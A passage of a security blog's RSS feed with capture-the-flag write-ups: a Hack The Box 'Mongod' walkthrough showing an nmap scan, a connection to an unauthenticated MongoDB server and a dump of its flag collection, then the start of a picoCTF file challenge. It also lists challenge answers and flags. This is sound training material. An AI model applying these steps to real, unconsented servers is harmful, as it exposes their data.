</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.28<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-wv2b0ymwtt<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ cat flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span>72eaf5344ebb84908ae543a719830519</span></span></code></pre></div>
<br>
<p><img src="image-1.png#center" alt="alt text"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Mongod</title>
      <link>http://localhost:1313/htb-mongod/</link>
      <pubDate>Wed, 10 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-mongod/</guid>
      <description>it&amp;rsquo;s been quite a while since I tackled any challenges on Hack The Box. My original plan was to strengthen my fundamentals on TryHackMe and then come back to Hack The Box. But now I&amp;rsquo;m thinking, why not do both at the same time? I can learn by diving in and trying things out as I go.
How many TCP ports are open on the machine? 2 1┌─[us-starting-point-vip-1-dhcp]─[10.10.14.28]─[leewookb@htb-l3lgefdeyz]─[~] 2└──╼ [★]$ sudo nmap -sC -sV 10.</description>
      <content:encoded><![CDATA[<p>it&rsquo;s been quite a while since I tackled any challenges on Hack The Box. My original plan was to strengthen my fundamentals on TryHackMe and then come back to Hack The Box. But now I&rsquo;m thinking, why not do both at the same time? I can learn by diving in and trying things out as I go.</p>
<div style="text-align: center"><img src="./just_do_it.gif"></div>
<hr>
<h4 id="how-many-tcp-ports-are-open-on-the-machine">How many TCP ports are open on the machine?</h4>






<pre tabindex="0"><code>2</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.28<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-l3lgefdeyz<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ sudo nmap -sC -sV 10.129.228.30 -p-
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.94SVN <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-07-10 23:00 CDT
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> 10.129.228.30
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.0087s latency<span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Not shown: <span style="color:#fab387">65533</span> closed tcp ports <span style="color:#89dceb;font-weight:bold">(</span>reset<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT      STATE SERVICE VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>| ssh-hostkey:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>|   <span style="color:#fab387">3072</span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span style="color:#89dceb;font-weight:bold">(</span>RSA<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>|   <span style="color:#fab387">256</span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span style="color:#89dceb;font-weight:bold">(</span>ECDSA<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>|_  <span style="color:#fab387">256</span> 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span style="color:#89dceb;font-weight:bold">(</span>ED25519<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>27017/tcp open  mongodb MongoDB 3.6.8 3.6.8</span></span></code></pre></div>
<br>
<h4 id="which-service-is-running-on-port-27017-of-the-remote-host">Which service is running on port 27017 of the remote host?</h4>






<pre tabindex="0"><code>MongoDB 3.6.8</code></pre>
<p><code>27017/tcp open  mongodb MongoDB 3.6.8 3.6.8</code></p>
<br>
<h4 id="what-type-of-database-is-mongodb-choose-sql-or-nosql">What type of database is MongoDB? (Choose: SQL or NoSQL)</h4>






<pre tabindex="0"><code>NoSQL</code></pre>
<p>MongoDB is a NoSQL database designed for scalability, flexibility, and ease of development. MongoDB stores data in flexible, JSON-like documents, meaning fields can vary from document to document and data structure can be changed over time. This differs from traditional relational databases that use tables and rows to store data.</p>
<br>
<h4 id="what-is-the-command-name-for-the-mongo-shell-that-is-installed-with-the-mongodb-clients-package">What is the command name for the Mongo shell that is installed with the mongodb-clients package?</h4>






<pre tabindex="0"><code>mongo</code></pre>
<br>
<h4 id="what-is-the-command-used-for-listing-all-the-databases-present-on-the-mongodb-server-no-need-to-include-a-trailing-">What is the command used for listing all the databases present on the MongoDB server? (No need to include a trailing ;)</h4>






<pre tabindex="0"><code>show dbs</code></pre>
<p>In order to connect to the remote MongoDB server we need to install the <code>mongodb</code> utility by running the following command:
<code>curl -O https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.4.7.tgz</code></p>
<p>then extract the contents of the tar archive file using the <code>tar</code> utility
<code>tar xvf mongodb-linux-x86_64-3.4.7.tgz</code></p>
<p>Then navigate to the <code>bin</code> folder to execute the mongo binary and connect to the MongoDB server
<code>./mongo mongodb://10.129.228.30:27017</code></p>
<p>We are connected to the mongoDB server.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.28<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-l3lgefdeyz<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~/Downloads/mongodb-linux-x86_64-3.4.7/bin<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ ./mongo mongodb://10.129.228.30:27017
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>MongoDB shell version v3.4.7
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>connecting to: mongodb://10.129.228.30:27017
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>MongoDB server version: 3.6.8
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>WARNING: shell and server versions <span style="color:#cba6f7">do</span> not match
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Welcome to the MongoDB shell.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>For interactive help, <span style="color:#89dceb">type</span> <span style="color:#a6e3a1">&#34;help&#34;</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>For more comprehensive documentation, see
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>	http://docs.mongodb.org/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Questions? Try the support group
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>	http://groups.google.com/group/mongodb-user
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>Server has startup warnings:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>2024-07-11T03:57:47.294+0000 I STORAGE  <span style="color:#89dceb;font-weight:bold">[</span>initandlisten<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>2024-07-11T03:57:47.294+0000 I STORAGE  <span style="color:#89dceb;font-weight:bold">[</span>initandlisten<span style="color:#89dceb;font-weight:bold">]</span> ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>2024-07-11T03:57:47.294+0000 I STORAGE  <span style="color:#89dceb;font-weight:bold">[</span>initandlisten<span style="color:#89dceb;font-weight:bold">]</span> **          See http://dochub.mongodb.org/core/prodnotes-filesystem
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>2024-07-11T03:57:49.369+0000 I CONTROL  <span style="color:#89dceb;font-weight:bold">[</span>initandlisten<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>2024-07-11T03:57:49.369+0000 I CONTROL  <span style="color:#89dceb;font-weight:bold">[</span>initandlisten<span style="color:#89dceb;font-weight:bold">]</span> ** WARNING: Access control is not enabled <span style="color:#cba6f7">for</span> the database.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>2024-07-11T03:57:49.369+0000 I CONTROL  <span style="color:#89dceb;font-weight:bold">[</span>initandlisten<span style="color:#89dceb;font-weight:bold">]</span> **          Read and write access to data and configuration is unrestricted.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>2024-07-11T03:57:49.369+0000 I CONTROL  <span style="color:#89dceb;font-weight:bold">[</span>initandlisten<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>&gt;</span></span></code></pre></div>
<br>
<p>the <code>help</code> command shows <code>show dbs</code> command lists all the databases present on the server.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>&gt; <span style="color:#89dceb">help</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>	db.help<span style="color:#89dceb;font-weight:bold">()</span>                    <span style="color:#89dceb">help</span> on db methods
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>	db.mycoll.help<span style="color:#89dceb;font-weight:bold">()</span>             <span style="color:#89dceb">help</span> on collection methods
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>	sh.help<span style="color:#89dceb;font-weight:bold">()</span>                    sharding helpers
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>	rs.help<span style="color:#89dceb;font-weight:bold">()</span>                    replica <span style="color:#89dceb">set</span> helpers
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>	<span style="color:#89dceb">help</span> admin                   administrative <span style="color:#89dceb">help</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>	<span style="color:#89dceb">help</span> connect                 connecting to a db <span style="color:#89dceb">help</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>	<span style="color:#89dceb">help</span> keys                    key shortcuts
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>	<span style="color:#89dceb">help</span> misc                    misc things to know
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>	<span style="color:#89dceb">help</span> mr                      mapreduce
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>	show dbs                     show database names</span></span></code></pre></div>
<br>
<h4 id="what-is-the-command-used-for-listing-out-the-collections-in-a-database-no-need-to-include-a-trailing-">What is the command used for listing out the collections in a database? (No need to include a trailing ;)</h4>






<pre tabindex="0"><code>show collections</code></pre>
<br>
<h4 id="what-is-the-command-used-for-dumping-the-content-of-all-the-documents-within-the-collection-named-flag-in-a-format-that-is-easy-to-read">What is the command used for dumping the content of all the documents within the collection named flag in a format that is easy to read?</h4>






<pre tabindex="0"><code>db.flag.find().pretty()</code></pre>
<br>
<p><code>help</code> command
<img src="image-1.png#center" alt="alt text"></p>
<br>
<p><code>db.mycoll.help()</code> command
<img src="image-2.png#center" alt="alt text"></p>
<br>
<p><code>db.mycoll.find().help()</code> command
<img src="image-3.png#center" alt="alt text"></p>
<br>
<h4 id="submit-root-flag">submit root flag</h4>






<pre tabindex="0"><code>1b6e6fb359e7c40241b6d431427ba6ea</code></pre>
<br>
<p><code>show dbs</code> -&gt; <code>use sensitive_information</code> -&gt; <code>show collections</code> -&gt; <code>db.flag.find()</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>&gt; show dbs
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>admin                  0.000GB
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>config                 0.000GB
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#89dceb">local</span>                  0.000GB
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>sensitive_information  0.000GB
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>users                  0.000GB
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>&gt; use sensitive_information
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>switched to db sensitive_information
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>&gt; show collections
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>flag
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>&gt; db.flag.find<span style="color:#89dceb;font-weight:bold">()</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">{</span> <span style="color:#a6e3a1">&#34;_id&#34;</span> : ObjectId<span style="color:#89dceb;font-weight:bold">(</span><span style="color:#a6e3a1">&#34;630e3dbcb82540ebbd1748c5&#34;</span><span style="color:#89dceb;font-weight:bold">)</span>, <span style="color:#a6e3a1">&#34;flag&#34;</span> : <span style="color:#a6e3a1">&#34;1b6e6fb359e7c40241b6d431427ba6ea&#34;</span> <span style="color:#89dceb;font-weight:bold">}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>&gt;</span></span></code></pre></div>
<br>
<p><img src="image-4.png#center" alt="alt text"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[picoCTF] CanYouSee</title>
      <link>http://localhost:1313/picoctf-canyousee/</link>
      <pubDate>Tue, 09 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/picoctf-canyousee/</guid>
      <description>This one from picoCTF was fairly easy, so I was unsure about uploading it. However, there was a part that I wasn&amp;rsquo;t familiar with, and I learned something new. So, why not?
Description How about some hide and seek?
As usual, I started by downloading the provided file to my local machine by using the wget command.
1──(kali㉿kali)-[~/Desktop/pico] 2└─$ wget https://artifacts.picoctf.net/c_titan/128/unknown.zip 3--2024-07-09 16:33:45-- https://artifacts.picoctf.net/c_titan/128/unknown.zip 4Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 54.230.253.65, 54.230.253.91, 54.230.253.20, .</description>
      <content:encoded><![CDATA[<p>This one from picoCTF was fairly easy, so I was unsure about uploading it. However, there was a part that I wasn&rsquo;t familiar with, and I learned something new. So, why not?</p>
<div style="text-align: center;"><img src="./giphy.gif"></div>
<hr>
<h3 id="description">Description</h3>
<p>How about some hide and seek?</p>
<hr>
<p>As usual, I started by downloading the provided file to my local machine by using the <code>wget</code> command.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/pico<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ wget https://artifacts.picoctf.net/c_titan/128/unknown.zip
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>--2024-07-09 16:33:45--  https://artifacts.picoctf.net/c_titan/128/unknown.zip
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Resolving artifacts.picoctf.net <span style="color:#89dceb;font-weight:bold">(</span>artifacts.picoctf.net<span style="color:#89dceb;font-weight:bold">)</span>... 54.230.253.65, 54.230.253.91, 54.230.253.20, ...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Connecting to artifacts.picoctf.net <span style="color:#89dceb;font-weight:bold">(</span>artifacts.picoctf.net<span style="color:#89dceb;font-weight:bold">)</span>|54.230.253.65|:443... connected.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>HTTP request sent, awaiting response... <span style="color:#fab387">200</span> OK
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Length: <span style="color:#fab387">2252108</span> <span style="color:#89dceb;font-weight:bold">(</span>2.1M<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>application/octet-stream<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>Saving to: ‘unknown.zip’
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>unknown.zip                            100%<span style="color:#89dceb;font-weight:bold">[============================================================================</span>&gt;<span style="color:#89dceb;font-weight:bold">]</span>   2.15M  11.2MB/s    in 0.2s
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>2024-07-09 16:33:47 <span style="color:#89dceb;font-weight:bold">(</span>11.2 MB/s<span style="color:#89dceb;font-weight:bold">)</span> - ‘unknown.zip’ saved <span style="color:#89dceb;font-weight:bold">[</span>2252108/2252108<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/pico<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>└─$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>unknown.zip</span></span></code></pre></div>
<br>
<p>Unzipped the unknown.zip file.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/pico<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└─$ unzip unknown.zip
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>Archive:  unknown.zip
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>  inflating: ukn_reality.jpg
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>
